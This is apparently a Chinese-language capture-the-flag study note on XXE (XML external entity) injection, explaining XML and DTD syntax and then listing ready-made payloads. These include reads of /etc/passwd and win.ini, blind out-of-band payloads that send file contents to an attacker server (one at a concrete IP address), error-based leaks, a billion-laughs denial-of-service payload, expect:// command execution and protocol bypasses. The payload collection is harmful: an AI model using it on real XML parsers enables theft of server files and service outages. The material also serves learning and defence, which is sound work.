# XXE注入

## 前言

XXE这个是最近在某国赛分区赛看到的一个知识点，好久没做，当时看到他许多的过滤，整个人都慌了。一直到今天才有时间来回顾一下。

## XXE

XXE: XML外部实体攻击，本质上就是： 攻击者自定义的XML文件进行了执行，最终效果：`任意文件读取`或`DOS攻击`。(php:可导致phar反序列化)

## XML & DTD

#### XML

基础教程：[菜鸟 XML](https://www.runoob.com/xml/xml-tutorial.html)。（其实不难发现：xml和html还是有一点点像的）

这里介绍一下特殊的内置变量(是不是和html一模一样了)

```tex
<!-- 内置变量 -->
&lt;	<
&gt;	>
&amp;	&
&quot;	"
&apos;	'
```

#### DTD

DTD文件格式： `<!DOCTYPE 根元素 [元素申明]>`.

eg.

```xml-dtd
<!DOCTYPE note [ 
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
```

#### DTD外部文档声明

从xml文件外部引入DTD

`<!DOCTYPE 根元素 SYSTEM "文件名">`

#### DTD声明

DTD可以

- 申明元素 `<!ELEMENT...`
- 为元素声明属性 `<!ATTLIST`
- 声明实体: `<!ENTITY...`

DTD声明元素

- `<!ELEMENT 元素名称 类别`
  - 类别：EMPTY, (#PCDATA), (#CDDATA),ANY
    - PCDATA: 会被解析器解析的文本，这些文本将杯解释器检查实体以及标记
    - CDDATA: 不会被解析器解析的文

- `<!ELEMENT 元素名臣 (元素内容)`

  - 多个元素内容 (1，2，3)
  - 元素内容次数：默认只出现一次
    - 最少出现一次：（元素+）
    - 出现0次或多次：（元素*）
    - 或：（message|body）
  - 混合类别和元素内容:
    - `<!ELEMENT note （#POCDATA|to|from|header|message）`

#### DTD声明属性

  ```
  <!ATTLIST 元素名称 属性名称 属性类型 默认值>
  ```

  - 属性：
    - CDATA 值为字符数据 (character data)
    - (en1|en2|..) 此值是枚举列表中的一个值
    - ID 值为唯一的 id
    - IDREF 值为另外一个元素的 id
    - IDREFS 值为其他 id 的列表
    - NMTOKEN 值为合法的 XML 名称
    - NMTOKENS 值为合法的 XML 名称的列表
    - ENTITY 值是一个实体
    - ENTITIES 值是一个实体列表
    - NOTATION 此值是符号的名称
    - xml: 值是一个**预定义的 XML 值
  - 默认值：
    - 值 属性的默认值
    - \#REQUIRED 属性值是必需的
    - \#IMPLIED 属性不是必需的
    - \#FIXED value 属性值是固定的

  DTD声明：

  ```
  <!ELEMENT square EMPTY>
  <!ATTLIST square width CDATA "0">
  ```

  XML使用：

  ```
  <square width="100" />
  ```

#### DTD声明实体

命名实体: `<!ENTITY 实体名称 值>`

外部实体：`<!ENTITY 实体名称 SYSTEM "URL/URI">`

参数实体： `<!ENTITY % 实体名称 "实体的值">`(只在DTD中有效)

外部参数实体： `<!ENTITY % 实体名称 SYSTEM "URI">`(只在DTD中生效)

## XXE 分类

- 经典XXE: 外部实体可以注入
- xxe盲注：无回显
- 报错XXE：通过报错信息获取
- DOS攻击：用于不断循环实体变量,导致内存爆炸

## 常用payload

### 0x01 经典XXE

直接使用外部实体进行文件读取

条件：

- 可以引入外部实体
- 服务器要回显结果

payload

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<foo>&xxe;</foo>
```

还可以使用外部参数实体+外部实体进行

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://xxxx/evil.dtd">
%xxe;]>
<foo>&evil;</foo>
```

远程dtd文件

```xml
<!ENTITY evil SYSTEM “file:///c:/windows/win.ini" >
```

### 0x02 XXE盲注

使用远程dtd，外部参数实体，外部实体进行文件读取

条件：

- 可以使用远程实体
- 受害者于攻击者远程网络可达

payload

攻击者主机xml文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt">
<!ENTITY % print "<!ENTITY send SYSTEM 'http://{ip}:{port}/xxe.xml?c=%file;'>">
%print;
```

> 这里执行print是必须的，外部实体内部不会解析参数实体的值

攻击者发送payload

```xml
<?xml version='1.0'?>
<!DOCTYPE RemoteDTD SYSTEM "http://{ip}:{port}/xxe.dtd" >
<!-- 引入&send;即可 -->
<root>&send;</root>
```

发送payload2

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY % dtd SYSTEM "http://{ip}:{port}/xxe.dtd">
%dtd;]>
<comment>
	<text>&send;</text>
</comment>
```

这里的有一个问题： `只能读到文件的第一个换行符`! 

> 1. FTP + `XXEserv`:但是显而易见这要求`%b`这个文件内容中不包含`:`不然就会，格式报错。所以还是前者比较好
> 2. HTTP(JDK1.7之前):http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
> 3. 

**一个疑问：可不可以不读取外部的dtd文件，直接读取file**

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt">
<!ENTITY % print "<!ENTITY send SYSTEM 'http://47.102.137.160:1234/xxe.xml?c=%file;'>">
%print;
]>
<comment>
	<text>&send;</text>
</comment>
```

这样子看上去好像是正确的，但是`xml:允许我们在外部dtd允许我们在第二个实体中包含一个实体，但是在内部dtd不可以`。这也是后面我们解决受害者的机器和我们机器不能网络相通，或者不能http协议解决的一个思路：[文章](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)。

**有趣的发现：**上面的协议本身是没有问题，但是一些解析器在实现的时候，也都能很好的发现，两层嵌套，但是对于三层嵌套就不能发现了，[于是有了下面这一篇文章](https://www.freebuf.com/vuls/207639.html).

报错

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ELEMENT message ANY>
    <!ENTITY % para1 SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % para '
        <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;http:///&#x25;para1;&#x27;>">
        &#x25;para2;
    '>
    %para;
]>
```

盲注

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % NUMBER '
        <!ENTITY &#x25; file SYSTEM "file:///d:/password.txt">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;http://127.0.0.1:8081/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>
    %NUMBER;
]>
<message>any text</message>
```

### 0x03 报错注入

```xml
?xml version="1.0"?>
<!DOCTYPE message [
    <!ELEMENT message ANY>
    <!ENTITY % para1 SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % para '
        <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;http:///&#x25;para1;&#x27;>">
        &#x25;para2;
    '>
    %para;
]>
```

报错：路径存在等

### 0x04 DOS攻击

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 0x05 载体的扩展

xml漏洞点不单是一个参数输入，还可以依托于其他格式的文件中，比如exel,pptx等。

- 解压
- 修改对应单元格的描述内容
- 插入头，插入内容

工具：https://github.com/BuffaloWill/oxml_xxe： 帮助我们生成其他格式的xml。

### 0x06 JSON格式转换

**支持json解析的位置一般也会支持xml**

### 0x07 本地DTD注入

当远程服务器不能访问我们放置恶意dtd文件的服务器时，同时又不能回显又不能使用经典的xxe，以上方法就都失效.

破局: 使用服务器上面已经存在的dtd文件,来一个外部实体注入.

> **如果我们定义了两个同名的参数实体，那么只有第一个参数实体是有效的。**

工具: https://github.com/GoSecure/dtd-finder

新增的java下的目录列表

> ```
> jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd"
> ```

> ```
> <!ENTITY % local_dtd SYSTEM "./../../properties/schemas/j2ee/XMLSchema.dtd">
> ```

## 绕过

### 协议绕过

| libxml2       | PHP                                                          | JAVA                                            | .NET                |
| ------------- | ------------------------------------------------------------ | ----------------------------------------------- | ------------------- |
| file http ftp | file http ftp php compress.zlib compress.bzip2 data glob phar expect | http htps ftp file jar netdoc mailto gopher csp | file http https ftp |

java中的`netdoc`:在高版本中的jdk已经不支持了.主要主要作用是替代file协议.

- php协议解析
  `<!ENTITY % file SYSTEM “php://filter/read=convert.base64-encode/resource=file:///D:/test.txt”>

- php如果开了PECL上的Expect扩展
  `<!ENTITY content SYSTEM "expect://dir .">`

- netdoc协议解析
  `<!ENTITY file SYSTEM "netdoc:///var/www/html">`

- jar协议文件上传至临时目录

  jar协议格式：`jar:{url}!{path}`

  1. 提供错误路径得到报错信息，临时文件目录地址
     jar:http://127.0.0.1:2014/xxe.jar!/1.php(错误路径)
  2. 使用[延长返回web服务器](https://github.com/pwntester/BlockingServer)，上面存放需要上传的文件，上传后会阻塞住保持临时文件一直存在。
  3. 使用netdoc协议查看临时文件目录下生成的临时文件，获取临时文件名。
  4. 再进行其他操作。

> JDK1.6u35 、JDK1.7u7 之后开始恢复对于gopher方案的支持
> libxml是PHP对xml的支持

### 编码绕过

`UTF-7编码`,`HTML实体编码`

### java组件

可以列举目录

https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/: 利用java组件的ssrf突破内网防火墙的限制来加载外部dtd.

https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/ ： 加载本地`dtd`文件的正确食用方法。

> https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxb-unmarshaller

## 参考资料

> 1. https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf
> 2. 修复: https://blog.spoock.com/2018/10/23/java-xxe/
> 3. https://www.leadroyal.cn/p/562/
> 4. https://github.com/LeadroyaL/java-xxe-defense-demo
> 5. https://github.com/LeadroyaL/java_xxe_2019
> 6. https://www.leadroyal.cn/p/914/
> 7. https://lalajun.github.io/2019/12/03/WEB-XXE/
> 7. https://github.com/GoSecure/dtd-finder